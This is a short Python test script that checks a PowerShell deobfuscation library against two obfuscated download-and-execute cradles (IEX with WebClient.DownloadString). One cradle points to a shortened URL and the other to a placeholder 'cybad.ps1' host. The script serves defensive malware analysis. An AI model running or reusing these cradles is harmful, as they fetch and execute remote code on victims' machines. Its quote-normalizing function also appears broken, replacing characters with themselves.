import pyminusone
import os

def normalize_command(command):
    """Normaliza caracteres especiais SEM adicionar espaços"""
    command = command.replace(''', "'")
    command = command.replace(''', "'")
    command = command.replace('"', '"')
    command = command.replace('"', '"')
    command = command.replace('′', "'")
    command = command.replace('″', '"')
    return command

def test_webclient_download():
    """Testa payload com WebClient e DownloadString"""
    print("=== Teste 1: Payload com WebClient DownloadString ===")
    obfuscated = "(\"{1}{0}\" -f 'x','IE') (&(\"{3}{2}{1}{0}\"-f'ct','-Obje','w','Ne') (\"{0}{2}{1}\"-f 'N','nt','et.WebClie')).(\"{2}{0}{1}{3}\"-f'dSt','rin','Downloa','g').Invoke(('''tp://','9','','git','.ly/','ht'))"
    print(f"Input: {obfuscated[:80]}...")
    
    result = pyminusone.deobfuscate_powershell(obfuscated)
    print(f"Output: {result}")
    print(f"Length - Input: {len(obfuscated)}, Output: {len(result)}")
    
    # Verificar se realmente desobfuscou
    if len(result) < len(obfuscated) * 0.8:  # Se o output é 20% menor, provavelmente desobfuscou
        print("✅ Parece que desobfuscou com sucesso!")
    else:
        print("⚠️ Pode não ter desobfuscado corretamente")
    print()

def test_problematic_command():
    """Testa comando com caracteres especiais problemáticos"""
    print("=== Teste 2: Comando com caracteres especiais ===")
    # Comando original com caracteres problemáticos
    obfuscated = "&(\"{1}{0}\" -f 'EX','I')(&(\"{1}{0}{2}\"-f 'Obje','New-','ct') (\"{1}{4}{3}{0}{2}\" -f'Clie','N','nt','t.Web','e')).(\"{1}{3}{0}{2}\" -f 'trin','Downl','g','oadS').Invoke((\"{1}{5}{2}{4}{3}{0}\" -f 'l/cybad.ps1′','h','ww','loca','w.demo.','ttp://'))"
    
    print(f"Input (original): {obfuscated[:80]}...")
    print(f"Caracteres especiais detectados:")
    if ''' in obfuscated or ''' in obfuscated:
        print("  - Aspas simples especiais encontradas")
    if '′' in obfuscated:
        print("  - Prime symbol (′) encontrado")
    
    # Normalizar antes de desobfuscar
    normalized = normalize_command(obfuscated)
    print(f"\nInput (normalizado): {normalized[:80]}...")
    print(f"Mudanças na normalização: {len(obfuscated)} -> {len(normalized)} chars")
    
    result = pyminusone.deobfuscate_powershell(normalized)
    print(f"Output: {result}")
    print(f"Length - Input: {len(normalized)}, Output: {len(result)}")
    
    # Verificar se realmente desobfuscou
    if len(result) < len(normalized) * 0.8:
        print("✅ Parece que desobfuscou com sucesso!")
    else:
        print("⚠️ Pode não ter desobfuscado corretamente")
    print()
    
if __name__ == "__main__":  
    test_webclient_download()
    test_problematic_command()